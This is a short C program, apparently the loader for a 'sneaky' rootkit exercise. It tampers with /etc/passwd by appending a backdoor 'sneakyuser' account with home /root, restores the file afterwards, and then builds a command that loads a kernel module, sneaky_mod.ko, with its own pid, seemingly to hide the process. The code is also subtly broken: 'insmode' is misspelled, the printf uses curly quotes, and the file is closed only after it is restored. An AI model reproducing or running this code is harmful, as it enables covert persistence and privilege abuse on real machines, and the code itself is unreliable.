#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

int main() {
  system("cp /etc/passwd /tmp/passwd");
  FILE *f = fopen("/etc/passwd", "a");
  if(f == NULL) {
    perror("fopen:");
  }
  fwrite("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash", 49, 1, f);
  system("cat /etc/passwd");
  system("cp /tmp/passwd /etc/passwd");
  fclose(f);
  pid_t mypid = getpid();
  printf(“sneaky_process pid = %d\n”, mypid);
  char command[50] = "insmode sneaky_mod.ko mypid=";
  char cpid[10];
  sprintf(cpid, "%d", mypid);
  strcat(command, cpid);
  system(command);
  return 0;
}
